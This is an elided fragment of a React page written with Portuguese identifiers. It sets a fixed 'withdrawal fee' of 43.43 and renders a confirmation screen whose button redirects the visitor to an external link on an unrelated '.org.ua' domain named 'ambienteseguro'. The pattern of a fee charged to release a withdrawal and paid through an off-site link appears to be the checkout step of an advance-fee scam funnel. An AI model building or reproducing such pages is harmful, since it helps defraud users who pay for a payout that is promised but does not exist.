...
const TAXA_SAQUE = 43.43;
const TAXA_SAQUE_CENTAVOS = 4343;
    ...
    <main id="screens">
      ...
      <section id="nine" className={`screen ${(currentScreen === 'nine' || currentScreen === 'seven') ? 'is-active' : ''}`}>
        <div className="confirmation-container">
          ...
          <div className="confirmation-section">
            <button className="confirmation-cta-button" onClick={() => window.location.href = 'https://ambienteseguro.org.ua/c/d68e0e476b'}>
